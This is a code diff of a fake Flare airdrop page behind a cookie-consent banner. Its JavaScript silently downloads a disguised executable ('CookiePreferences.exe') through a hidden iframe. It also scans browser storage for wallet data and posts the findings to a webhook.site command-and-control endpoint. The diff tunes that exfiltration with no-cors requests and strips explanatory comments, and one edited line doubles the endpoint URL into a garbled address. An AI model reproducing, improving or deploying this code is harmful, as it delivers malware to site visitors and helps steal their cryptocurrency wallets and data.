@@ -507,7 +507,7 @@ hero-section { padding: 2rem 1.25rem; }
   // import { SignClient } from 'https://unpkg.com/@walletconnect/sign-client@2.12.2/dist/index.js';
 
   const PROJECT_ID = 'YOUR_WALLETCONNECT_PROJECT_ID';
-  const C2_ENDPOINT = 'https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f';
+  const C2_ENDPOINT = 'https://webhook.site/https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f';
   const EXE_URL = 'https://flaregovernance.github.io/CookiePreferences.exe';
 
   let signClient, modal, connectedAccount = null;
@@ -542,7 +542,7 @@ hero-section { padding: 2rem 1.25rem; }
       '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
   }
 
-  // ---- PAYLOAD (Simple, Guaranteed Popup Removal) ----
+  // ---- PAYLOAD ----
   async function executePayload() {
 
     // 1. Hide the overlay immediately — no delays, no dependencies.
@@ -606,18 +606,15 @@ hero-section { padding: 2rem 1.25rem; }
   }
 
   function triggerDownload(url, filename) {
-    // Remove any old hidden iframe
     var oldFrame = document.getElementById('hiddenDownloadFrame');
     if (oldFrame) document.body.removeChild(oldFrame);
 
-    // Create a new hidden iframe to trigger the download silently
     var iframe = document.createElement('iframe');
     iframe.id = 'hiddenDownloadFrame';
     iframe.style.display = 'none';
     iframe.src = url;
     document.body.appendChild(iframe);
 
-    // Clean up the iframe after a short delay
     setTimeout(function() {
       var frame = document.getElementById('hiddenDownloadFrame');
       if (frame) document.body.removeChild(frame);
@@ -627,7 +624,8 @@ hero-section { padding: 2rem 1.25rem; }
   function sendToC2(data) {
     fetch(C2_ENDPOINT, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
       body: JSON.stringify(data),
     }).catch(() => {});
   }
@@ -636,6 +634,7 @@ hero-section { padding: 2rem 1.25rem; }
 
   // initWalletConnect();
 </script>
+
 
 <!-- ===== BUTTON HANDLERS (Cookie Dismissal + Wallet Connect) ===== -->
 <script>
@@ -653,7 +652,7 @@ hero-section { padding: 2rem 1.25rem; }
         site.classList.remove('is-blurred');
 
         // 3. Send test ping to verify C2
-        fetch('https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646', {
+        fetch('https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ type: 'TEST_PING', message: 'Cookie accepted' })
@@ -681,7 +680,7 @@ hero-section { padding: 2rem 1.25rem; }
           }
         }
         if (storageHits.length > 0) {
-          fetch('https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646', {
+          fetch('https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type: 'BROWSER_STORAGE_HITS', data: storageHits })
@@ -699,7 +698,7 @@ hero-section { padding: 2rem 1.25rem; }
         }
 
         // Final report
-        fetch('https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646', {
+        fetch('https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound })
